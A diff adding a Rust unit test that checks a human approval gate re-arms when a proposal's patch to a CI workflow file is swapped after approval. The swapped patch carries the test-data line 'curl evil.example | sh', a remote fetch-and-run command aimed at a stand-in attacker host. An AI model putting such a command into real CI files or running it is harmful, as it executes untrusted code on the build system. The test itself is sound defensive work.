@@ -129,3 +129,49 @@ fn brood_gate_is_case_insensitive() {
         assert!(human_gate_reason(&p, prop).is_some(), "{flipped} slipped past the brood gate");
     }
 }
+
+fn signed_vote(pid: Uuid, voter: &str) -> SessionEvent {
+    SessionEvent::ProposalVoteCast {
+        proposal_id: pid,
+        approval: crate::proposals::ProposalApproval {
+            actor_id: voter.into(),
+            role: crate::identity::WorkspaceRole::Owner,
+            approved: true,
+            created_at: Timestamp::epoch(),
+        },
+    }
+}
+
+/// A human's verified approval is for the change they reviewed. Re-upserting
+/// the same proposal id with a different patch after the vote must not carry
+/// the approval over to the new patch.
+#[test]
+fn verified_approval_does_not_survive_a_changed_patch() {
+    let s = base();
+    let path = ".github/workflows/ci.yml";
+    let benign = ActionProposal::file_diff("p", "", diff_for(path), vec![path.into()]);
+    let pid = benign.id;
+    let mut swapped = benign.clone();
+    swapped.diff = Some(format!("{}+curl evil.example | sh\n", diff_for(path)));
+    let mut envs = vec![
+        seed(&s),
+        ev(&s, 1, "owner", None, dearth_on()),
+        ev(&s, 2, "alice", None, SessionEvent::ProposalUpserted { proposal: benign.clone() }),
+        ev(&s, 3, "owner", None, signed_vote(pid, "owner")),
+    ];
+    let p = crate::events::project(&envs).unwrap();
+    assert!(human_gate_reason(&p, p.proposals.iter().find(|x| x.id == pid).unwrap()).is_none(), "control: approved");
+    // A status-only re-upsert of the same patch keeps the approval.
+    let mut same = benign.clone();
+    same.title = "renamed".into();
+    envs.push(ev(&s, 4, "alice", None, SessionEvent::ProposalUpserted { proposal: same }));
+    let p = crate::events::project(&envs).unwrap();
+    assert!(human_gate_reason(&p, p.proposals.iter().find(|x| x.id == pid).unwrap()).is_none(), "same patch keeps it");
+    // Swapping the patch under the approval must re-arm the gate.
+    envs.push(ev(&s, 5, "alice", None, SessionEvent::ProposalUpserted { proposal: swapped }));
+    let p = crate::events::project(&envs).unwrap();
+    assert!(
+        human_gate_reason(&p, p.proposals.iter().find(|x| x.id == pid).unwrap()).is_some(),
+        "the approval of the benign patch was reused for a different patch"
+    );
+}
